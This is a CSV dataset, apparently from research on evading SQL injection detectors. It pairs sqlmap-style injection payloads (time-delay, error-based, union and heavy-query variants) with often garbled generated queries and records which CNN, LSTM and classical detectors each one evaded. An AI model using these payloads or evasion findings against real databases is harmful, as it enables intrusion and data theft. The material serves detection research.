,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
3648,"1%'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  '%'  =  '",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT chr ( 112 ) ORDER BY chr ( 65 ),1,1,0,0,0,0,0
3649,"-5218  )   union all select 9677,9677#","SELECT 9677,9677# FROM SQL injections WHERE NOT -5218 = ""SQL""",1,1,1,1,0,1,0
3650,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
3651,1%'   )    )     )   and 7219  =  7361 and    (    (     (  '%'  =  ',SELECT MIN((((((((((()) FROM SQL injection detection) FROM SQL injection detection),1,1,0,0,1,0,0
3652,"-2916""   )    )    or 4946  =  8232--",SELECT MIN(exast_injection) FROM SQL_injection WHERE NOT SELECT MIN(exast_injection) = 4946 = 8232,1,1,0,0,1,0,0
3653,"1'+  (  select 'sppw' where 1677  =  1677 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'","SELECT MIN(spw) FROM SQL injection detection WHERE 1677 = 1677 AND NOT elt ( SELECT elt ( 0x71706a71, 0x71706a71) +'",0,1,1,1,0,1,0
3654,-6712'   )    )    as kqff where 9146  =  9146 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,SELECT MIN(sequence) FROM SQL injection WHERE 9146 = 9146 OR 5903 = 5903 = (SELECT SUM(insert -6712')),1,1,0,0,0,0,0
3655,"-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo",SELECT MIN(5023 ='sql injection') FROM SQL SELECT MIN(5023 = ctxsys.drithsx.sn) ORDER BY 113,0,1,0,0,0,0,0
3656,"1' in boolean mode  )   union all select null,null,null--","SELECT MIN(null,null--) FROM SQL injection detection",1,1,1,1,1,1,1
3657,-7279  )   or 9898  =  9963 and   (  1481  =  1481,"SELECT * FROM Query: -7279, 9898 = 9963 AND 1481 = 1481",1,1,0,1,0,0,0
3658,-8523  )   as hzqs where 8944  =  8944 order by 1--,SELECT -8523 ) FROM hzqs WHERE 8944 = 8944 ORDER BY 1--,1,1,1,1,0,1,0
3659,"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wynp","SELECT DISTINCT esq_injection FROM SQL_injection WHERE NOT i_injection = 1 AND 4241 = ""convert ( +char ( 113 )"" ORDER BY i_injection)",1,1,0,0,0,0,0
3660,"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mmgx"" like ""mmgx","SELECT MIN(sequence) FROM SQL injection detection) AND 3754 = 3754 = ""from dual""",1,1,0,0,1,0,0
3661,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""zzmn""  =  ""zzmn","SELECT * FROM SQL injection, COUNT(*) FROM rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 AND ((*) = 0 FROM SQL injection)",1,1,0,0,0,0,0
3662,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""%""  =  ""","SELECT dbms_pipe.receive_message, COUNT(*) FROM dbms_pipe.receive_message WHERE NOT SQL_injection_message = ""valid"" AND 67 -|chr ( 101 )",0,1,0,0,1,0,0
3663,"1""  )   where 9570  =  9570 rlike   (  select   (  case when   (  1642  =  3686  )   then 1 else 0x28 end   )    )   --","SELECT MIN(sql injection) FROM SQL_injection WHERE 9570 = 9570 = ""rlike (SELECT MIN(success)"" AND 1 = 1",1,1,0,0,0,0,0
3664,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",SELECT 'uckz' FROM SQL injection',1,1,1,1,1,1,1
3665,"1""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""urgd""  =  ""urgd",SELECT MIN(6055 ='sq injection') FROM SQL injection JOIN (SELECT SUM(6055 = ctxsys.drithsx.sn) FROM SELECT SUM(6055 = ctxsys.drithsx.sn) FROM SELECT SUM(6055 ='sq injection') AND (((s) ='sql injection'),0,1,0,0,1,0,0
3666,1'  )   as mwpp where 6192  =  6192,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(6192 = 6192) FROM SQL SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT,1,1,0,0,1,0,0
3667,1' in boolean mode  )   rlike sleep  (  5  )  #,SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
3668,"1'  )   where 7658  =  7658 union all select null,null#",SELECT MIN(null#) FROM SQL injection detection,1,0,1,1,1,1,1
3669,"-8988""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""dyxh"" like ""dyxh",SELECT MIN(5023 ='sq injection') FROM SQL injection,1,1,1,0,1,1,0
3670,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection',1,0,1,1,1,1,1
3671,"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'cdgm' like 'cdgm","SELECT MIN(suel) FROM SQL injection detection) FROM SQL SELECT MIN(suel) FROM SELECT MIN(suel) FROM SELECT MIN(suel) FROM SQL SELECT MIN(suel) FROM SELECT MIN(suel) FROM SELECT MIN(suel) FROM SELECT MIN(suel) FROM SELECT MIN(suelt (3484 = 3484,1 - select * FROM * * FROM SELECT SUM(s) FROM SQL SELECT SELECT MIN(s) FROM SELECT SELECT MIN(suelt) FROM SELECT SELECT MIN(suel) FROM SQL injection)",1,1,0,0,1,0,0
3672,"-8588' union all select 2135,2135--","SELECT MIN(2135,2135--) FROM SQL injection AS t1 JOIN Query: -8588' union = ""SQL""",0,1,0,0,0,0,0
3673,if  (  1928  =  4811  )   select 1928 else drop function ucko--,SELECT MIN(1928 = 4811) FROM SQL injection detection,1,1,0,1,1,1,0
3674,1'  )   as pudv where 2609  =  2609,SELECT MIN(2609 = 2609) FROM SQL injection detection,1,1,1,1,1,1,1
3675,"-8698"" where 1990  =  1990 or   (  8459  =  8459  )  *4906--","SELECT MIN(90 = 1990) FROM SQL_injection WHERE ""sql injection detection"" ='sql injection'",1,1,0,0,0,0,0
3676,"1%' and elt  (  7619  =  1489,1489  )   and '%'  =  '","SELECT MIN(1489 = 7619 = 1489,1489 ) FROM SQL injection detection",1,1,0,0,0,0,0
3677,"1'||  (  select 'epjr' from dual where 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT 0x5c, 'epjr) FROM SQL SELECT, 'epjr' FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(",1,0,1,1,1,1,1
3678,1'+  (  select zpdf where 2938  =  2938,SELECT zpdf FROM SQL injection detection WHERE NOT SELECT zpdf FROM query: 1'+ (SELECT zpdf FROM query: 1'+) ORDER BY generated,1,1,0,1,1,1,0
3679,"1"" where 3247  =  3247 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL injection detection WHERE 3247 = 3247 = 3247 OR 1022 = (SELECT MIN(*) FROM SQL),1,1,0,0,0,0,0
3680,select   (  case when   (  5796  =  8326  )   then 5796 else 5796*  (  select 5796 from information_schema.character_sets  )   end  )  #,SELECT 5796 FROM SQL AS _valid_sq_inject_searcher WHERE NOT 5796 = 8326 AND NOT 5796 = 5796* (SELECT 5796 FROM information_schema.character_sets ),1,1,0,1,0,0,0
3681,"-5478""  )   where 4100  =  4100 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",SELECT MIN(sqlid_to_sqlhash) FROM SQL injection WHERE 4100 = 4100 OR 4747 = 'dbms_utility.sqlid_to_sqlhash',1,1,1,0,0,0,0
3682,1'+  (  select gthp where 7311  =  7311 or sleep  (  5  )  #,SELECT gthp FROM SQL injection_detection WHERE 7311 = 7311 OR sleep ( 5 ) = 7311,1,1,0,0,0,0,0
3683,"1""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL injection detection WHERE NOT SQL injection detection = 'evade SQL injection',1,0,1,1,1,1,1
3684,"-3278'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'zxig' like 'zxig","SELECT MIN(1032 = 10432,3623) FROM elt WHERE NOT'sq injection' IN (SELECT MIN(sql injection)','sql injection') ORDER BY'sql injection'",1,1,0,0,0,0,0
3685,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj","SELECT DISTINCT COUNT(*) FROM SQL injection detection WHERE NOT vudj IN (SELECT vudj FROM query: 1"" ORDER BY vudj)",1,1,1,1,1,1,1
3686,"1"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL injection,1,1,1,1,1,1,1
3687,"1""   )    )    as dksq where 7161  =  7161",SELECT MIN(sql injection) FROM SQL SELECT dksq FROM SELECT 7161 = 7161,1,1,1,1,1,1,1
3688,"-6279'  )   union all select 3026,3026,3026,3026,3026,3026,3026,3026--","SELECT MIN(3026,3026,3026,3026,3026-- for SQL injection' FROM SQL SELECT MIN(SQL injection) FROM 3026 WHERE NOT3026,3026,3026,3026,3026,3026,3026-- for'",1,1,1,0,0,0,0
3689,"-9566%""  )   union all select 7973,7973,7973,7973--","SELECT MIN(7973,7973--) FROM SQL injection_description",1,1,1,0,1,1,0
3690,"1   )    )    and elt  (  9288  =  6067,6067  )   and    (    (   1895  =  1895","SELECT * FROM SQL AS t1 JOIN 6067,6067 - & (( 1895 = 1895) FROM elt WHERE NOT 9288 = 6067,6067 = ""valid"" AND SELECT t1. SELECT t1. SELECT t1., t1.1895 = 1895",0,1,0,0,0,0,0
3691,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",SELECT MIN(success injection) FROM SQL_Injections WHERE NOT 0x7171706a71 = 'ayqn',1,1,1,0,1,1,0
3692,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'","SELECT t1.sqpjg FROM evade SQL injection_description AS t1 JOIN 1'|| AS t2 ON t1.select = 'elt ( 1832 = 6644,6644 )||'''''''''''''''''''''''''''''''''''''''''''''''''''ssl injection'','sql injection','sql injection' FROM SQL_injection'",0,1,0,0,0,0,0
3693,"1   )    )    as debc where 7428  =  7428 union all select null,null,null#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT 7428 = 7428,1,1,1,1,1,1,1
3694,"1 and make_set  (  8403  =  8403,8899  )  ","SELECT 8403 = 8403,8899 AND NOT SQL_inject = ""SQL""",0,1,1,0,0,0,0
3695,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #","SELECT MIN(1210 = 1210,sleep ( 5 ) FROM SQL injection detection) FROM SQL injection detection",1,1,0,0,1,0,0
3696,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # cdjm",SELECT NOT crypt_key FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM cdjm',1,0,1,0,1,1,0
3697,select pg_sleep  (  5  )   and 'zfyy'  =  'zfyy,SELECT pg_sleep ( 5 ) FROM pg_sleep WHERE NOT pg_sleep = 'valid' ORDER BY 'zfyy',1,1,0,0,0,0,0
3698,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--","SELECT MIN(1993,1993,1993,1993-- as zfnf' FROM SQL JOIN 1993, 1993 = 1993 WHERE ""SQL injection"" = 'SQL'",1,1,1,0,0,0,0
3699,1 and 9412  =  6877#,SELECT * FROM query: 1 AND NOT SQL_inject = 6877#,1,1,1,1,1,1,1
3700,"-4541""   )    )    or make_set  (  4821  =  5233,5233  )   and    (    (   ""xfex""  =  ""xfex","SELECT MIN(4821 = 5233,5233) FROM SQL injection detection",1,1,1,1,1,1,1
3701,"1%'   )    )     )   union all select null,null,null,null,null,null#","SELECT MIN(sql injection) FROM SQL - SELECT null,null,null FROM SQL SELECT MIN(sql injection) FROM SQL",1,1,1,1,1,1,1
3702,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey","SELECT DISTINCT COUNT(*) FROM SQL injection detection WHERE NOT vhey = ""vhey"" AND NOT vhey = ""evade""",1,1,0,0,1,0,0
3703,1  )   and 8417  =  5276#,SELECT * FROM query: 1 JOIN SQL injection query query: 8417 = 5276#,0,1,1,1,1,1,1
3704,"-2140   )    )    union all select 8174,8174,8174#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT DISTINCT - 8174,8174 = 'excel injection'",1,1,1,1,1,1,1
3705,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  ""","SELECT MIN(excat) FROM SQL, SELECT MIN(excat) FROM SQL injection, extractvalue WHERE NOT md5 ( 0x52515a50 ) = '%'",1,1,0,0,1,0,0
3706,"-2167'   )    )     )   union all select 3804,3804,3804,3804,3804,3804#","SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT 3804,3804,3804,3804# FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -2167'",1,1,1,0,1,1,0
3707,"1'   )    )    as dtwh where 9633  =  9633 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql ) FROM SQL injection detection WHERE 9633 = 9633 AND char( 109 ) ||char ( 70 ) = regexp_substring,1,1,0,0,0,0,0
3708,1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
3709,"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --","SELECT MIN(sql injection) FROM SQL_injection WHERE 6318 = 6318 AND extractvalue (7982,concat ( 0x7171706a71 ) = ""SQL injection detection""",1,1,0,0,0,0,0
3710,"-6406%'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  '",SELECT MIN(sql injection) FROM SQL injection detection) ORDER BY MIN(sql injection),1,0,1,1,1,1,1
3711,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,"SELECT *2572, ((1199 = 1199) FROM SQL AS _valid_sQCH_injector__9311 ) ORDER BY COUNT(*) DESC LIMIT 565 = 2572 AND ((1199 = 1199)",0,1,0,0,0,0,0
3712,"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
3713,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
3714,"-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#","SELECT MIN(1998,1998,1998,1998,1998# FROM SQL_Injections WHERE NOT Query: -7746' ) ='sql injection detection'",1,1,0,1,0,0,0
3715,"1"" where 2677  =  2677 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
3716,"1%""",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
3717,"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",SELECT MIN(sequence) FROM SQL injection >'sq injection',1,0,1,1,1,1,1
3718,end and    (    (   '%'  =  ',SELECT MIN(%) = '%' FROM SQL injection',1,1,0,0,0,0,0
3719,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT kpso FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT kpso FROM SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT SUM(swift_off) FROM SELECT SUM(swift_off) FROM SELECT MIN(swift_offening FROM SQL SELECT MIN(swift) FROM SELECT SELECT MIN(swift_induced) FROM SELECT SELECT MIN(swift_induced) FROM SELECT SELECT MIN(swift_induced) FROM SQL SELECT SELECT MIN(swift_induced) FROM SELECT SELECT MIN(swift_induced) FROM SELECT ,1,0,1,0,1,1,0
3720,"1""  )   as lvbm where 8179  =  8179",SELECT MIN(8179 = 8179) FROM SQL injection detection,1,1,0,0,1,0,0
3721,-7231   )    )    union all select 7639#,SELECT 7639# FROM SQL injection_description WHERE NOT SELECT MIN(sql injection) FROM query: -7231 ),1,1,1,1,1,1,1
3722,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- rlas","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL AS rlas FROM query: 1 ORDER BY query: 8466 = rlas",1,1,0,0,1,0,0
3723,1'+  (  select 'gtqr' where 5660  =  5660,SELECT'sql injection detection' FROM SQL SELECT SELECT 'gtqr' FROM SELECT SELECT MIN(5660 = 5660) FROM SQL injection,1,1,0,1,1,1,0
3724,"1%""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL injection detection WHERE NOT all_users = 'Y',1,1,0,0,1,0,0
3725,"1"" where 9618  =  9618 and   (  3020  =  3020  )  *6703--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: 1 WHERE 9618 = 9618 AND 3020 = 3020,1,1,0,0,1,0,0
3726,"1'   )    )    as kdwc where 5906  =  5906 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM kdwc WHERE 5906 = 5906 = 5906,1,1,0,0,0,0,0
3727,"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",SELECT MIN(SQL) FROM SQL injection detection) AND 3754 = 3754,1,1,0,0,1,0,0
3728,-2402 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- szgq,SELECT MIN(szgq) FROM SQL injection,1,1,1,1,1,1,1
3729,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
3730,"1%' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '%'  =  '",SELECT MIN(*) FROM SQL injection detection WHERE NOT rdb$types ='sql injection' AND 6414 ='sql injection',1,1,0,0,1,0,0
3731,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--","SELECT MIN(sql injection) FROM SQL_injection WHERE 6101 = 6101 = 6101 union All select 6101,6101,6101,6101,6101,6101,6101--",1,1,0,0,0,0,0
3732,"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""bmbg"" like ""bmbg","SELECT DISTINCT bmbg FROM ""sql injection detection""",1,0,1,1,1,1,1
3733,"-5625"" union all select 6087,6087,6087,6087,6087,6087--","SELECT MIN(6087,6087,6087,6087,6087,6087-- FROM SQL injection_description WHERE NOT SELECT MIN(sql injection) FROM Query: -5625"" union All select 6087,6087,6087,6087,6087,6087,6087-- FROM SQL_Injections WHERE NOT SELECT MIN(sql injection) FROM Query: -5625""",1,1,1,0,0,0,0
3734,1'   )    )    as yyud where 4934  =  4934,SELECT MIN(4934 = 4934) FROM SQL injection detection,1,1,1,1,1,1,1
3735,"-7744""   )    )     )   union all select 9408,9408,9408,9408--","SELECT 9408,9408,9408-- FROM SQL_Injections WHERE NOT 9408,9408_- if executed = ""done""",1,1,1,1,0,1,0
3736,"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'msjw' like 'msjw","SELECT MIN(*) FROM SQL injection detection WHERE NOT msjw IN (SELECT msjw FROM rdb$fields as t1,rdb$types as t3,rdb$functions as t3,rdb$functions as t4 ) AND (SELECT msjw FROM rdb$fields WHERE NOT msjw ='sq injection')",0,1,0,0,0,0,0
3737,1 where 6827  =  6827,SELECT * FROM query: 1 WHERE NOT SQL_injection = 6827,1,1,1,1,1,1,1
3738,"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dnmi"" like ""dnmi",SELECT dnmi FROM SQL_Injections WHERE NOT chr ( 112 ) ORDER BY dnmi_pipe.receive_message,1,0,1,1,1,1,1
3739,"1  )   where 5465  =  5465 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN sysibm.systables as t3 ON sysibm.systables = t2.sysibm.systables as t3 JOIN sysibm.systables as t3 JOIN sysibm.systables as t3 ORDER BY COUNT(*) DESC",1,1,0,0,0,0,0
3740,"1%'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection) AND NOT (SELECT 0x7171706a71, (SELECT 0x7171706a71,'sql injection')",1,1,0,0,1,0,0
